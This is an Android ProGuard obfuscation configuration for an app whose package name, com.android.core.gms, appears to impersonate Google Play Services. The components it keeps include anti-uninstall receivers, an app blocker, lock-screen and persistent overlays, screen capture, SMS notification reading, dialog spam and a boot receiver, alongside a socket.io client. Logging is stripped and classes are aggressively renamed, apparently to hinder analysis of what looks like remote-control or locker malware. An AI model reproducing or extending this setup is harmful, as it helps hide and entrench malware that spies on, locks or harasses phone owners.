# Aggressive obfuscation
-repackageclasses 'x'
-allowaccessmodification
-flattenpackagehierarchy 'x'
-optimizationpasses 5

# Strip all logging
-assumenosideeffects class android.util.Log {
    public static boolean isLoggable(java.lang.String, int);
    public static int v(...); public static int i(...);
    public static int w(...); public static int d(...); public static int e(...);
}

-keep class io.socket.** { *; }
-keep class okhttp3.** { *; }
-keep class okio.** { *; }
-dontwarn okhttp3.** -dontwarn okio.**
-keep class androidx.** { *; }
-dontwarn com.google.android.gms.**

# Keep manifest components
-keep class com.android.core.gms.MainActivity { *; }
-keep class com.android.core.gms.DeviceService { *; }
-keep class com.android.core.gms.BootReceiver { *; }
-keep class com.android.core.gms.AntiUninstallReceiver { *; }
-keep class com.android.core.gms.AppBlockerService { *; }
-keep class com.android.core.gms.SmsNotifService { *; }
-keep class com.android.core.gms.LockNewActivity { *; }
-keep class com.android.core.gms.LockOverlayService { *; }
-keep class com.android.core.gms.PersistentOverlayService { *; }
-keep class com.android.core.gms.ScreenCaptureActivity { *; }
-keep class com.android.core.gms.TTSService { *; }
-keep class com.android.core.gms.DialogSpamService { *; }
-keep class com.android.core.gms.VideoOverlayService { *; }
-keep class com.android.core.gms.AntiUninstallHelper { *; }

-keepclassmembers class * implements android.os.Parcelable {
    public static final android.os.Parcelable$Creator CREATOR;
}
-keepclassmembers enum * {
    public static **[] values();
    public static ** valueOf(java.lang.String);
}
-dontwarn **
